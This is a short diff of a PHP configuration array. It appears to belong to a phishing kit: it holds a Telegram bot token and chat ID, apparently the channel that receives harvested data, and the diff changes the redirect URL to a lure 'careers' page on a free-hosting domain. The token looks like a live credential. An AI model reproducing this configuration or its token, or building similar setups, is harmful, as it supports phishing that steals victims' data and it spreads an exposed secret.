@@ -21,7 +21,7 @@ $site_map = [
 
             ['token' => '8327467242:AAFFBheM0nU1-45BKH5vAvdfXKhgXPopJvg', 'chat_id' => '7919111838']
         ],
-        'redirect' => 'https://paysphere.42web.io/cache_site/careers/all-listings.job.34092/thankyou.html'
+        'redirect' => 'https://paysphere.42web.io/cache_site/careers/all-listings.job.34092/processing.html'
     ],
     
 
